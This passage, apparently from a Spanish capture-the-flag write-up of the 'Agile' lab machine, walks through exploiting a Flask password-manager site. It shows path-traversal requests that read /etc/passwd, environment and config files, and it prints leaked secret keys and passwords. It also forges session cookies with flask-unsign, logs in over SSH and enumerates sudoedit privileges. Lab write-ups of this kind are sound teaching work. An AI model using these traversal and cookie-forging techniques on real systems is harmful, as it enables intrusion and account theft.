text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 14:51:57 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 1744\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\\nmessagebus:x:103:104::/nonexistent:/usr/sbin/nologin\\nsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\\npollinate:x:105:1::/var/cache/pollinate:/bin/false\\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\\nusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\\ncorum:x:1000:1000:corum:/home/corum:/bin/bash\\ndnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\\nmysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false\\nrunner:x:1001:1001::/app/app-testing/:/bin/sh\\nedwards:x:1002:1002::/home/edwards:/bin/bash\\ndev_admin:x:1003:1003::/home/dev_admin:/bin/bash\\n_laurel:x:999:999::/var/log/laurel:/bin/false\\n~~~\\n\\nConsultamos las variables de entorno del sistema\\n\\n~~~http\\nGET /download?fn=../../proc/self/environ HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n![](/Agile/Pasted_image_20230306121100.png)\\n\\nBuscamos el directorio /app/config_prod.json\\n\\n~~~http\\nGET /download?fn=../../home/dev_admin/app/config_prod.json HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\nNo tenemos acceso al archivo pero encontramos un campo llamado secret en la respuesta\\n\\n~~~http\\nHTTP/1.1 500 INTERNAL SERVER ERROR\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:15:35 GMT\\nContent-Type: text/html; charset=utf-8\\nContent-Length: 13637\\nConnection: close\\n\\n\u003c!doctype html\u003e\\n\u003chtml lang=en\u003e\\n  \u003chead\u003e\\n    \u003ctitle\u003ePermissionError: [Errno 13] Permission denied: '/tmp/../../home/dev_admin/app/config_prod.json'\\n // Werkzeug Debugger\u003c/title\u003e\\n    \u003clink rel=\\\"stylesheet\\\" href=\\\"?__debugger__=yes\u0026amp;cmd=res\u0026amp;f=style.css\\\"\u003e\\n    \u003clink rel=\\\"shortcut icon\\\"\\n        href=\\\"?__debugger__=yes\u0026amp;cmd=res\u0026amp;f=console.png\\\"\u003e\\n    \u003cscript src=\\\"?__debugger__=yes\u0026amp;cmd=res\u0026amp;f=debugger.js\\\"\u003e\u003c/script\u003e\\n    \u003cscript\u003e\\n      var CONSOLE_MODE = false,\\n          EVALEX = true,\\n          EVALEX_TRUSTED = false,\\n          SECRET = \\\"0k71JQ5bp0qM5tHnQe0w\\\";\\n    \u003c/script\u003e\\n  \u003c/head\u003e\\n~~~\\n\\nDatos del archivo hosts\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:03 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 253\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n127.0.0.1 localhost superpass.htb test.superpass.htb\\n127.0.1.1 agile\\n\\n# The following lines are desirable for IPv6 capable hosts\\n::1     ip6-localhost ip6-loopback\\nfe00::0 ip6-localnet\\nff00::0 ip6-mcastprefix\\nff02::1 ip6-allnodes\\nff02::2 ip6-allrouters\\n~~~\\n\\nArchivo /etc/mysql/my.cnf\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:05 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 682\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n#\\n# The MySQL database server configuration file.\\n#\\n# You can copy this to one of:\\n# - \\\"/etc/mysql/my.cnf\\\" to set global options,\\n# - \\\"~/.my.cnf\\\" to set user-specific options.\\n# \\n# One can use all long options that the program supports.\\n# Run program with --help to get a list of available options and with\\n# --print-defaults to see which it would actually understand and use.\\n#\\n# For explanations see\\n# http://dev.mysql.com/doc/mysql/en/server-system-variables.html\\n\\n#\\n# * IMPORTANT: Additional settings that can override those from this file!\\n#   The files must end with '.cnf', otherwise they'll be ignored.\\n#\\n\\n!includedir /etc/mysql/conf.d/\\n!includedir /etc/mysql/mysql.conf.d/\\n~~~\\n\\nKernel versión\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:08 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 184\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\nLinux version 5.15.0-60-generic (buildd@lcy02-amd64-054) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #66-Ubuntu SMP Fri Jan 20 14:29:49 UTC 2023\\n~~~\\n\\n\\nNginx error log\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:51 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 82947\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n2023/02/28 16:21:17 [error] 1004#1004: *14 open() \\\"/app/app/superpass/static/webfonts/josefinsans.ttf\\\" failed (2: No such file or directory), client: 10.10.14.40, server: superpass.htb, request: \\\"GET /static/webfonts/josefinsans.ttf HTTP/1.1\\\", host: \\\"superpass.htb\\\", referrer: \\\"http://superpass.htb/static/css/josefinsans.css\\\"\\n2023/02/28 16:23:58 [error] 1004#1004: *18 open() \\\"/app/app/superpass/static/webfonts/josefinsans.ttf\\\" failed (2: No such file or directory), client: 10.10.14.40, server: superpass.htb, request: \\\"GET /static/webfonts/josefinsans.ttf HTTP/1.1\\\", host: \\\"superpass.htb\\\", referrer: \\\"http://superpass.htb/static/css/josefinsans.css\\\"\\n\\n~~~\\n\\nConsultamos el archivo  /app/config_prod.json\\n\\n~~~http\\nGET /download?fn=../../app/config_prod.json HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n~~~ bash\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 17:15:30 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 88\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n{\\\"SQL_URI\\\": \\\"mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass\\\"}\\n~~~\\n\\nCódigo fuente de app.py\\n\\n~~~http\\nGET /download?fn=../../app/app/superpass/app.py HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n~~~python\\n\\nimport json\\nimport os\\nimport sys\\nimport flask\\nimport jinja_partials\\nfrom flask_login import LoginManager\\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))\\nfrom superpass.infrastructure.view_modifiers import response\\nfrom superpass.data import db_session\\n\\napp = flask.Flask(__name__)\\napp.config['SECRET_KEY'] = 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'\\n\\n\\ndef register_blueprints():\\n    from superpass.views import home_views\\n    from superpass.views import vault_views\\n    from superpass.views import account_views\\n    \\n    app.register_blueprint(home_views.blueprint)\\n    app.register_blueprint(vault_views.blueprint)\\n    app.register_blueprint(account_views.blueprint)\\n\\n\\ndef setup_db():\\n    db_session.global_init(app.config['SQL_URI'])\\n\\n\\ndef configure_login_manager():\\n    login_manager = LoginManager()\\n    login_manager.login_view = 'account.login_get'\\n    login_manager.init_app(app)\\n\\n    from superpass.data.user import User\\n\\n    @login_manager.user_loader\\n    def load_user(user_id):\\n        from superpass.services.user_service import get_user_by_id\\n        return get_user_by_id(user_id)\\n\\n\\ndef configure_template_options():\\n    jinja_partials.register_extensions(app)\\n    helpers = {\\n        'len': len,\\n        'str': str,\\n        'type': type,\\n    }\\n    app.jinja_env.globals.update(**helpers)\\n\\n\\ndef load_config():\\n    config_path = os.getenv(\\\"CONFIG_PATH\\\")\\n    with open(config_path, 'r') as f:\\n        for k, v in json.load(f).items():\\n            app.config[k] = v\\n\\n\\ndef configure():\\n    load_config()\\n    register_blueprints()\\n    configure_login_manager()\\n    setup_db()\\n    configure_template_options()\\n\\n\\ndef enable_debug():\\n    from werkzeug.debug import DebuggedApplication\\n    app.wsgi_app = DebuggedApplication(app.wsgi_app, True)\\n    app.debug = True\\n\\n\\ndef main():\\n    enable_debug()\\n    configure()\\n    app.run(debug=True)\\n\\n\\ndef dev():\\n    configure()\\n    app.run(port=5555)\\n\\n\\nif __name__ == '__main__':\\n    main()\\nelse:\\n    configure()\\n\\n~~~\\n\\nUsamos el secret_key para extraer la información de la cookie del usuario\\n\\nCredenciales encontradas\\n\\n~~~bash\\nflask-unsign --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD --decode --cookie .eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vEF5_-9daSA.ZAYqgQ.Zvh6p_nlvHTv1LtEwEhcdp-rjUo\\n~~~\\n\\n~~~python\\n{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '9'}\\n~~~\\n\\nCreamos nuestra propia session\\n\\n~~~python\\n{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}\\n~~~\\n\\nEl comando a usar es:\\n\\n~~~bash\\nflask-unsign --sign --cookie \\\"{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}\\\" -S  MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD \\n.eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vHLz-APu_WkA.ZAYrig.VWDh3LEQeurRSGRbKa66sTMRUPA\\n~~~\\n\\n![](/Agile/Pasted_image_20230306150725.png)\\n\\nLuego lo intentamos con el  \\\\_user_id: 2\\n\\n![](/Agile/Pasted_image_20230306150956.png)\\n\\nUsers:\\n\\n~~~bash\\ncorum\\nrunner\\nedwards\\ndev_admin\\nsuperpassuser\\n~~~\\n\\nPasswords:\\n\\n~~~bash\\nMNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD\\ndSA6l7q*yIVs$39Ml6ywvgK\\n0k71JQ5bp0qM5tHnQe0w\\n~~~\\n\\n~~~text\\n0xdf:762b430d32eea2f12970\\n0xdf:5b133f7a6a1c180646cb\\ncorum:47ed1e73c955de230a1d\\ncorum:9799588839ed0f98c211\\ncorum:5db7caa1d13cc37c9fc2\\n~~~\\n\\n## Getting a shell\\n\\nIntentamos acceder a través de SSH con las credenciales del usuario Corum\\n\\n~~~ bash\\nssh corum@10.129.30.106\\n~~~\\n\\n![](/Agile/Pasted_image_20230306155037.png)\\n\\n### System Enumeration\\n\\nProcesos interesantes\\n\\n![](/Agile/Pasted_image_20230306160615.png)\\n\\nArchivos interesantes\\n\\n~~~bash\\n/var/www/html/index.nginx-debian.html                                                                                                                                                 \\n/app/app-testing/__pycache__/wsgi-dev.cpython-310.pyc\\n/app/app-testing/tests/functional/creds.txt\\n/app/app-testing/tests/functional/__pycache__/test_site_interactively.cpython-310-pytest-7.2.0.pyc\\n/app/app-testing/tests/functional/test_site_interactively.py\\n/app/app-testing/requirements.txt\\n/app/app-testing/.pytest_cache/.gitignore\\n/app/app-testing/.pytest_cache/CACHEDIR.TAG\\n/app/app-testing/.pytest_cache/v/cache/stepwise\\n/app/app-testing/.pytest_cache/v/cache/nodeids\\n/app/app-testing/.pytest_cache/v/cache/lastfailed\\n/app/app-testing/.pytest_cache/README.md\\n/app/app-testing/superpass/views/__pycache__/home_views.cpython-310.pyc\\n/app/app-testing/superpass/views/__pycache__/account_views.cpython-310.pyc\\n/app/app-testing/superpass/views/__pycache__/vault_views.cpython-310.pyc\\n/app/app-testing/superpass/views/vault_views.py\\n/app/app-testing/superpass/views/home_views.py\\n/app/app-testing/superpass/views/account_views.py\\n/app/app-testing/superpass/__pycache__/app.cpython-310.pyc\\n/app/app-testing/superpass/__pycache__/__init__.cpython-310.pyc\\n~~~\\n\\n## Privilege Escalation a Edwards\\n\\nIntentamos acceder al servicio en el puerto 5555, es la misma aplicación pero corriendo como testing y localmente en el sistema Agile\\n\\n~~~bash\\nssh -L 8080:localhost:5555 corum@10.10.11.203\\n~~~\\n\\nNos registramos con un usuario e intentamos acceder a los recursos del sistema, pero no podemos.\\n\\nTomamos nuestra cookie y vemos que el id asignado es el 2\\n\\n~~~bash\\nflask-unsign --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD --decode --cookie .eJzdkEuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005BZZFUXVg6KecK4btUUbzD9PMEcXuGprdFEY4HtTamq2-8WsN3PcDYn00BzL2sxv73zB6TV8OHca-km7tgXmY39od2uBGWohVOUg_4yrJUqxit4RyySaslrCgjVb69FLsM5LFnaxUmYq6JE1jNHjhGlErgm1YsLIYeRErogLk-TkvDIWh8EJ5ynXalO0Ghltn39-NN3fazy8_gAATZH3.ZAn1Rg.T8uAe8cVXAmBs1AoJY-LcqIjJHc\\n~~~\\n\\n~~~json\\n{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '2'}\\n~~~\\n\\nAsumimos que la SECRET_KEY es la misma e intentamos crear una sesion con el id 1\\n\\n~~~bash\\nflask-unsign --sign --cookie \\\"{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}\\\" -S  MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD \\n.eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vHLz-APu_WkA.ZAYrig.VWDh3LEQeurRSGRbKa66sTMRUPA\\n~~~\\n\\nLogramos acceder a las credenciales del usuario edwards\\n\\n![](/Agile/Pasted_image_20230309120804.png)\\n\\n\\nSus datos son:\\n\\n~~~\\nedwards:d07867c6267dcb5df0af\\ndedwards__:7dbfe676b6b564ce5718\\n~~~\\n\\nFinalmente ingresamos al sistemas a través de ssh con estas últimas credenciales\\n\\n![](/Agile/Pasted_image_20230309121717.png)\\n\\n## User Edwards Enumeration\\n\\nVerificamos los permisos sudo\\n\\n~~~\\nsudo -l\\n~~~\\n\\n~~~bash\\n[sudo] password for edwards: \\nMatching Defaults entries for edwards on agile:\\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\\\:/snap/bin, use_pty\\n\\nUser edwards may run the following commands on agile:\\n    (dev_admin : dev_admin) sudoedit /app/config_test.json\\n    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt\\n\\n~~~\\n\\nCon sudoedit podemos modificar un archivo protegido por el administrador\\n\\nIntentamos acceder al archivo config_test.json\\n\\n~~~bash\\nsudo -u dev_admin sudoedit /app/config_test.json\\n~~~\\n\\nconfig_test.json\\n\\n![](/Agile/Pasted_image_20230309122920.png)\\n\\n~~~json\\n{\\n    \\\"SQL_URI\\\": \\\"mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest\\\"\\n}\\n~~~\\n\\nIntentamos acceder al archivo creds.txt\\n\\n~~~bash\\nsudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt\\n~~~\\n\\nSu cotenido es:\\n\\n![](/Agile/Pasted_image_20230309122823.png)\\n\\n~~~\\nedwards:1d7ffjwrx#$d6qn!9nndqgde4\\n~~~\\n\\n\\nVerificamos cuales son los archivos que el usuario web_admin puede modificar \\n\\n~~~bash\\nfind /  -user dev_admin 2\u003e/dev/null | xargs ls -al --color\\n~~~\\n\\n~~~bash\\n-rw-r----- 1 dev_admin runner      34 Mar 10 17:18 /app/app-testing/tests/functional/creds.txt\\n-r--r----- 1 dev_admin www-data    88 Jan 25 00:00 /app/config_prod.json\\n-r--r----- 1 dev_admin runner      99 Jan 25 15:15 /app/config_test.json\\n~~~\\n\\nVerificamos que puede modificar el grupo dev_admin\\n\\n~~~bash\\nfind /  -group dev_admin 2\u003e/dev/null | xargs ls -al --color\\n~~~\\n\\n~~~bash\\n-rw-r--r-- 1 root      dev_admin 9033 Mar 10 17:21 /app/venv/bin/Activate.ps1\\n-rw-rw-r-- 1 root      dev_admin 1976 Mar 10 17:21 /app/venv/bin/activate\\n-rw-r--r-- 1 root      dev_admin  902 Mar 10 17:21 /app/venv/bin/activate.csh\\n-rw-r--r-- 1 root      dev_admin 2044 Mar 10 17:21 /app/venv/bin/activate.fish\\n\\n/app/venv:\\ntotal 24\\ndrwxrwxr-x 5 root dev_admin 4096 Feb  8 16:29 .\\ndrwxr-xr-x 6 root root      4096 Feb  8 16:29 ..\\ndrwxrwxr-x 2 root dev_admin 4096 Mar 10 17:21 bin\\ndrwxrwxr-x 3 root root      4096 Feb  8 16:29 include\\ndrwxrwxr-x 3 root root      4096 Feb  8 16:29 lib\\nlrwxrwxrwx 1 root root         3 Jan 25 17:21 lib64 -\u003e lib\\n-rw-rw-r-- 1 root root        70 Jan 25 17:21 pyvenv.cfg\\n\\n/app/venv/bin:\\ntotal 1380\\ndrwxrwxr-x 2 root dev_admin    4096 Mar 10 17:21 .\\ndrwxrwxr-x 5 root dev_admin    4096 Feb  8 16:29 ..\\n-rw-r--r-- 1 root dev_admin    9033 Mar 10 17:21 Activate.ps1\\n-rw-rw-r-- 1 root dev_admin    1976 Mar 10 17:21 activate\\n-rw-r--r-- 1 root dev_admin     902 Mar 10 17:21 activate.csh\\n-rw-r--r-- 1 root dev_admin    2044 Mar 10 17:21 activate.fish\\n-rwxrwxr-x 1 root root          213 Mar 10 17:21 flask\\n-rwxr-xr-x 1 root root          222 Jan 24 18:06 gunicorn\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip3\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip3.10\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 py.test\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pytest\\nlrwxrwxrwx 1 root root            7 Mar 10 17:21 python -\u003e python3\\nlrwxrwxrwx 1 root root           16 Mar 10 17:21 python3 -\u003e /usr/bin/python3\\nlrwxrwxrwx 1 root root            7 Mar 10 17:21 python3.10 -\u003e python3\\n-rwxrwxr-x 1 root root      1349984 Jan 23 21:45 uwsgi\\nls: cannot open directory '/home/dev_admin': Permission denied\\n\\n~~~\\n\\nPara comprender mayormente el sistema revisamos el script test_and_update.sh\\n\\n~~~bash\\n#!/bin/bash\\n\\n# update prod with latest from testing constantly assuming tests are passing\\n\\necho \\\"Starting test_and_update\\\"\\ndate\\n\\n# if already running, exit\\nps auxww | grep -v \\\"grep\\\" | grep -q \\\"pytest\\\" \u0026\u0026 exit\\n\\necho \\\"Not already running. Starting...\\\"\\n\\n# start in dev folder\\ncd /app/app-testing\\n\\n# system-wide source doesn't seem to happen in cron jobs\\nsource /app/venv/bin/activate\\n\\n# run tests, exit if failure\\npytest -x 2\u003e\u00261 \u003e/dev/null || exit\\n\\n# tests good, update prod (flask debug mode will load it instantly)\\ncp -r superpass /app/app/\\necho \\\"Complete!\\\"\\n\\n~~~\\n\\nBásicamente lo que hace es validar la aplicación con un conjunto de pruebas, si estas prueabas son aprobadas, la aplicación es copiada en la carpeta /app y pasa a producción. Vemos que el script usa el archivo  /app/venv/bin/activate. Además, el usuario dev_admin tiene permisos de grupo para escribir sobre el.\\n\\nIntentaremos que el script source /app/venv/bin/activate quede de la 